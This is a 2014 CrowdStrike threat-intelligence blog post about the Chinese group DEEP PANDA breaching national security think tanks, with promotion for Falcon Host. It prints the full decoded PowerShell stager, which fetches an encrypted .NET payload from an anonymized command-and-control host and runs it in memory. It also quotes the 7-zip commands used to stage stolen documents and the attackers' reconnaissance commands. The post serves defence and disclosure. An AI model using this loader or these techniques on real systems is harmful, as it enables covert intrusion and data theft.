{
    "title": "deep in thought_ chinese targeting of national security think tanks »",
    "text": "CATEGORIES\nCONNECT WITH US\nFEATURED ARTICLES\nCybersecurity in the Time of COVID-19:\nKeys to Embracing (and Securing) a\nRemote Workforce\nMarch 11, 2020\nCrowdStrike Strengthens Its\nCybersecurity Alliances Ecosystem in\nthe Battle Against Advanced Threats\nMarch 10, 2020\nBeware: Third Parties Can Undermine\nYour Security\nMarch 5, 2020\nHow to Manage a Host Firewall with\nCrowdStrike\nMarch 4, 2020\nSUBSCRIBE\nSign up now to receive the latest\nnotifications and updates from\nCrowdStrike.\nSIGN UP\n*NEW* Community Tool: CrowdStrike Heartbleed Scanner CrowdStrike ShellShock Scanner – New Community Tool \n\n  BLOG FEATURED RECENT VIDEOS CATEGORIES\nJuly 7, 2014 Dmitri Alperovitch Executive Viewpoint\n Tweet  Share\nCybersecurity in the Time\nof COVID-19: Keys to\nEmbracing (and Securing)\na Remote Workforce\nToday's declaration of a global\npandemic by the World Health\nOrganization underscores what\nwe are all …CrowdStrike Strengthens\nIts Cybersecurity Alliances\nEcosystem in the Battle\nAgainst Advanced Threats\nThis year at RSA 2020, I was\nexcited to announce the\nlaunch of several new\nofferings …The CrowdStrike 2020\nGlobal Threat Report\nReveals Troubling\nAdvances in Cybercrime\nThose of us who have worked in\ncybersecurity for many years\noften start to think we’ve …Deep in Thought: Chinese Targeting of\nNational Security Think Tanks\nFor some time now, CrowdStrike has been working with a number of national security think tanks and\nhuman rights organizations on a pro bono basis to help them with their security posture. These\norganizations face some of the most advanced nation-state adversaries — China, Russia, and Iran, just to\nname a few. The individuals who are typically targeted at these institutions tend to be former senior\ngovernment officials who still have lots of contacts within Western governments and, as such, their private\ncorrespondence is of extreme interest to these attackers.\nThe intelligence services of these nation states are always on the lookout for any clues they may extract\nfrom such private communications that may give them an advanced insight into what options government\npolicy makers are considering on particular issues of interest. At the same time, with access to the victim\nemail mailboxes, the adversaries can craft very realistic spear-phishing lures to the government contacts of\ntargeted think tank personnel by piggybacking on ongoing real conversations and increasing their chances\nof a successful compromise of an official government email account.\nDespite this high threat level, these think tanks are organized as non-profits and often do not have the\nbudgets of commercial organizations to afford cutting-edge security technologies that can help them\neffectively detect these threats. For this reason, CrowdStrike has provided our Falcon Host endpoint security\ntechnology to many of these organizations at no charge to them to help detect and attribute these attackers\non their networks in real time, as well as to receive instantaneous full forensic visibility into their behavior to\nhelp with full remediation of any incident.\nRecently, Falcon Host has detected multiple simultaneous compromises at several national security think\ntanks from an actor we call DEEP PANDA, one of the most advanced Chinese nation-state cyber intrusion\ngroups. For almost three years now, CrowdStrike has monitored DEEP PANDA targeting critical and strategic\nbusiness verticals including: government, defense, financial, legal, and the telecommunications industries.\nAt the think tanks, Falcon Host detected targeting of senior individuals involved in geopolitical policy issues,\nin particular in the China/Asia Pacific region. However, last week the unprecedented real-time visibility\nprovided by Falcon Host into this actor’s escapades allowed analysts to observe a radical change in\ntargeting.\nThis actor, who was engaged in targeting and collection of Southeast Asia policy information, suddenly\nbegan targeting individuals with a tie to Iraq/Middle East issues. This is undoubtedly related to the recent\nIslamic State of Iraq and the Levant (ISIS) takeover of major parts of Iraq and the potential disruption for\nmajor Chinese oil interests in that country. In fact, Iraq happens to be the fifth-largest source of crude oil\nimports for China and the country is the largest foreign investor in Iraq’s oil sector. Thus, it wouldn’t be\nsurprising if the Chinese government is highly interested in getting a better sense of the possibility of deeper\nU.S. military involvement that could help protect the Chinese oil infrastructure in Iraq. In fact, the shift in\ntargeting of Iraq policy individuals occurred on June 18, the day that ISIS began its attack on the Baiji oil\nrefinery.\nThe Attacks\nCrowdStrike’s Falcon Host technology used by these think tanks consists of a tiny (under 5mb in size) kernel\nsensor that is deployed on Windows and Mac servers, desktops, and laptops and is able to do real-time\ndetection and recording of all adversary activities taking place on the system. In addition, by matching the\ndetected activities against our vast Adversary Intelligence  repository, Falcon Host can automatically\nattribute the attack to a known adversary group and provide details about their motivations, capabilities,\nand key Tactics, Techniques, and Procedures (TTPs).\nRecently, we detected breaches of these networks via the use of powershell scripts deployed by the\nadversary as scheduled tasks on Windows machines. The scripts are passed to the powershell interpreter\nthrough the command line to avoid placement of extraneous files on the victim machine that could\npotentially trigger AV- or Indicator of Compromise (IOC)-based detection.\nThe scripts were scheduled to call back every two hours to the DEEP PANDA Command and Control (C2)\ninfrastructure.\nThe script in the command line is base64 encoded, but when decoded it translates to the following code\nsnippet:\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n$wc = New-Object -TypeName System.Net.WebClient\n$wc.Headers.Add(“Accept-Language”, “en-US,en;q=0.” + ([IntPtr]::Size –  \n1).ToString())\n$wc.Headers.Add(“User-Agent”, “Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1;  \nWOW64; Trident/6.0)”)\n$rndn = Get-Random\n$wc.Headers.Add(“Cookie”, “p=” + $rndn)\n$data = $wc.DownloadData(“https://<ANONYMIZED>/config/oauth/”)\n[string[]]$xags = “https://<ANONYMIZED>/config/login/”, “WMITool.Program”, “Main”,  \n“/f”, “ssh”, “/s”, “<ANONYMIZED>”, “/p”, “443”\n$Passphrase = “<ANONYMIZED>”\n$salts = “<ANONYMIZED>”\n$r = new-Object System.Security.Cryptography.RijndaelManaged\n$pass = [System.Text.Encoding]::UTF8.GetBytes($Passphrase)\n$salt = [System.Text.Encoding]::UTF8.GetBytes($salts)\n$r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, “SHA1”,  \n5).GetBytes(32) #256/8\n$r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash(  \n[Text.Encoding]::UTF8.GetBytes($rndn) )[0..15]\n$d = $r.CreateDecryptor()\n$ms = new-Object IO.MemoryStream @(,$data)\n$cs = new-Object Security.Cryptography.CryptoStream $ms,$d,”Read”\n$dfs = New-Object System.IO.Compression.GzipStream $cs,  \n([IO.Compression.CompressionMode]::Decompress)\n$msout = New-Object System.IO.MemoryStream\n[byte[]]$buffer = new-object byte[] 4096\n[int]$count = 0\ndo\n{\n $count = $dfs.Read($buffer, 0, $buffer.Length)\n $msout.Write($buffer, 0, $count)  \n} while ($count -gt 0)\n$dfs.Close()\n$cs.Close()\n$ms.Close()\n$r.Clear()\n[byte[]]$bin = $msout.ToArray()\n$al = New-Object -TypeName System.Collections.ArrayList\n$al.Add($xags)\n$asm = [System.Reflection.Assembly]::Load($bin)\n$asm.EntryPoint.Invoke($null, $al.ToArray())\nsleep 5\nExit\nOnce executed, it downloads and executes from memory a .NET executable (typically named Wafer), which\nin turn typically downloads and runs MadHatter .NET Remote Access Tool (RAT), one of the favorites of DEEP\nPANDA. By running them from memory, it leaves no disk artifacts or host-based IOCs that can be identified\nin forensic analysis. This is typical for DEEP PANDA — stealth is their specialty and they prefer to operate in a\nway that leaves a minimal footprint on a victim system and often allows them to evade detection for a very\nlong time.\nFor this same reason, DEEP PANDA likes to use webshells to keep low-footprint persistent access to the\nvictim network, as we’ve covered in our prior blogs . This case was no exception, and that initial webshell\nimplant allowed them to execute reconnaissance commands such as “tasklist, ” “net view, ” and “net\nlocalgroup administrators, ” and then afterward to deploy the powershell scripts.\nThe adversary used stolen credentials to mount network shares via “net use ” command. In one case, they\nbrought in Cult of the Dead Cow’s NetE  tool onto the system, but most of the time they leveraged existing\nWindows tools and avoided bringing many new tools into the environment that could make them noisy and\neasily detectable by technologies that scan for static IOCs.\nAfter using compromised credentials to mount file shares, the adversary was seen compressing data using\n7-zip. They were adding different document types to compressed files by wildcarding the extensions, such\nas:\n“C:Program Files7-Zip7z” a setup1.log -r -pkkk*** “\\<share name>users<UserName>*rtf  \n*doc”\n“C:Program Files7-Zip7z” a setup1.log -r -pkkk*** “\\<share name>users<UserName>*ppt”\nThey knew exactly which users to target based on their research policy area, and they rapidly pivoted from\nChina/Asia Pacific policy experts to Iraq/Middle East policy experts once their tasking collection\nrequirements changed.\nAggressive Use of Ping to Determine Which Machines of Interest are Online\nOn one of the compromised machines, the adversary brought in a command-line version of RAR archiver\nthat was named “cftmon.exe ” and placed it into “c:windowstemphotfix ” directory. The files were encrypted\n(both file data and headers) with “uinfw ” password and the archive files were named after the initials of each\nuser that had been targeted and stored in the same “c:windowstemphotfix ” directory.\nFor lateral movement, they used WMI to deploy the powershell scripts remotely and setup scheduled tasks\non the remote systems.\nDespite the fact that we were seeing nearly identical TTPs used across multiple think-tank targets, there is\nevidence to indicate that these operations had different individuals behind the keyboard based on the\nintricacies of how certain powershell command lines had been used in each case.\nSummary\nDEEP PANDA presents a very serious threat not just to think tanks, but also multinational financial\ninstitutions, law firms, defense contractors, and government agencies. Due to their stellar operational\nsecurity and reliance on anti-forensic and anti-IOC detection techniques, detecting and stopping them is\nvery challenging without the use of next-generation endpoint technology like Falcon Host.  Not only was\nFalcon Host able to detect this adversary without relying on static signatures or IOCs, but it was able to\nprovide instantaneous and full forensic analysis of what had occurred on each of the compromised\nendpoints without the need to pull hard drives and do costly and time-intensive forensics, substantially\nreducing the time needed for remediation.\nIf you are a non-profit think tank or a human rights organization that would like to take advantage of our\nno-charge offer of Falcon Host licenses for your servers and desktops, please email us at\nsales@crowdstrike.com  with the subject “Non-Profit Falcon Host Offer. ”  \nOur Falcon Intelligence subscribers have had access to multiple reports on the DEEP PANDA actor that\nincludes full analysis of their attribution, tradecraft and TTPs, as well as detection indicators and signatures\nand remediation instructions. And our CrowdStrike Services  has worked on multiple intrusion investigations\nrelated to DEEP PANDA in the last year. If you would also like to see a demo of Falcon Host or Falcon\nIntelligence in action or discuss our Services offerings, please contact our Sales Team  to schedule a\npersonal briefing.\nStay safe and keep a watchful eye on the Pandas, Bears, Kittens, and other threat actors  who are relentlessly\npreying on your data!\nScreen Shot 2014-06-27 at 11.40.50 AM.png\ndeeppanda_thinktankblog.png\nScreen Shot 2014-06-27 at 11.15.47 AM.png\nScreen Shot 2014-06-27 at 10.58.35 AM.png\nDmitri Alperovitch\nDmitri Alperovitch is a Co-founder of CrowdStrike who left the company in February 2020.\nRelated Content\n(179)ENDPOINT PROTECTION\n(13)ENGINEERING & TECH\n(105)EXECUTIVE VIEWPOINT\n(87)FROM THE FRONT LINES\n(124)RESEARCH & THREAT INTEL\n(67)TECH CENTER\n\nSee CrowdStrike\nFalcon in Action\nDetect, prevent, and respond to\nattacks— even malware-free\nintrusions—at any stage, with\nnext-generation endpoint\nprotection.\nSEE DEMO\n      \nCopyright © 2020 CrowdStrike | Privacy | Request Info | Blog | Join Our Team | Sitemap | Contact Us | 1.888.512.8906 English\nFeatured \nRecent \nVideos\nCategories \n "
}